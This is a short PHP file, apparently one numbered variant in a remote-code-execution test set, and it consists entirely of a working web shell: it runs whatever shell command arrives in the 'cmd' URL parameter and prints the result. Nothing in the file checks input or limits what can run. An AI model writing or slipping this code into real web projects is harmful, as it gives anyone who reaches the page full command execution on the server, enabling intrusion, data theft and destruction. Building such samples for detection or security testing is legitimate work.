<?php
// RCE test variation #897
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>